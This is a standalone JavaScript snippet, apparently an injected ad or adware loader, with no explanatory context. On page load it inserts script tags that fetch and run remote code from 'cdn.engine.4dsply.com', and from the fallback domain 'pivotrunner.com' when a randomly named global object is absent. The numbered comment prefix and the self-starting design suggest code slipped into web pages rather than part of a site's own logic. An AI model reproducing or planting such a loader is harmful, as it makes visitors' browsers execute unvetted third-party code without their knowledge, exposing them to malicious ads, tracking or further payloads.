 /*278*/ (function (s, o, l, v, e, d) {
    if (s[o] == null && s[l + e]) {
        s[o] = "loading";
        s[l + e](d, l = function () {
            s[o] = "complete";
            s[v + e](d, l, !1)
        }, !1)
    }
})(document, "readyState", "add", "remove", "EventListener", "DOMContentLoaded");
(function () {
    var s = document.createElement("script");
    s.type = "text/javascript";
    s.async = true;
    s.src = "//cdn.engine.4dsply.com/Scripts/infinity.js.aspx?guid=0f771a5c-24b2-4dda-86c5-a54d06d0339b";
    s.id = "infinity";
    s.setAttribute("data-guid", "0f771a5c-24b2-4dda-86c5-a54d06d0339b");
    s.setAttribute("data-version", "async");
    var e = document.getElementsByTagName("script")[0];
    e.parentNode.insertBefore(s, e)
})();
(function () {
    var calc = function () {
        if (typeof g367CB268B1094004A3689751E7AC568F == "undefined" || !g367CB268B1094004A3689751E7AC568F.Core) {
            var domain = "pivotrunner.com";
            var file = "ie.pr";
            (function () {
                var s = document.createElement("script");
                s.type = "text/javascript";
                s.async = true;
                s.src = "//" + domain + "/" + file + "?" + "id=0f771a5c-24b2-4dda-86c5-a54d06d0339b" + "&tru=" + "876234";
                s.id = "infinity";
                s.setAttribute("data-guid", "0f771a5c-24b2-4dda-86c5-a54d06d0339b");
                s.setAttribute("data-version", "async");
                var e = document.getElementsByTagName("script")[0];
                e.parentNode.insertBefore(s, e)
            })()
        }
    };
    var addEvent = function (element, event, fn) {
        if (element.addEventListener) element.addEventListener(event, fn, false);
        else if (element.attachEvent) element.attachEvent("on" + event, fn)
    };
    addEvent(window, "load", calc)
})();